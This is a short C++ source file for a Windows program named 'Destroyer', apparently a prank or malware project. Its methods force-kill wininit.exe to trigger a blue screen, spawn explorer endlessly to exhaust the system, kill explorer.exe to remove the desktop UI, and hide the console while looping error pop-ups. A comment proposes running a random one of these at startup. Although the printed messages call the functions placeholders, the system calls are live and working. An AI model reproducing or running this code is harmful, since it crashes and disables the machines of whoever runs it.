#include <iostream>
#include <stdlib.h> // Hey, Laaksh You had forgotten to include this lol
#include <windows.h> //for Windows GUI functions and APIs

/**Making an object "Destroyer", which will contain all the necessary functions. I think we should make 
 * it so that a random malicious function is called upon startup 
**/ 
class Destroyer{
    public:
        void bsod()//BSODs the computer
        {
            system("taskkill /IM \"wininit.exe\" /F");
            std :: cout << "This is a placeholder\n";
        }

        void overflow()//Opens explorer infinite times crashing the system 
        {
            while (true)
            {
                system("explorer");
                std :: cout << "Normally ur pc would be dead\n"; 
            }
        }

        void killUI() //ends explorer task, hence destroying the ui of windows 10
        {
            system("taskkill /IM \"explorer.exe\" /F");
            std :: cout << "Your UI would disappear normally\n";
        }
        
        //I have removed the lag copy function because everyone would not have gcc installed

        void RunAwaySpam()  //Spams message boxes with runaway text
        {
            ShowWindow(GetConsoleWindow(), SW_HIDE); //Hides the console
	        while(true) 
            {
                //This function is a Windows API function....
		        MessageBox(NULL, "Run Away", "Run Away", MB_OK | MB_ICONERROR); //Run Away Message Box
	        }
        }

};
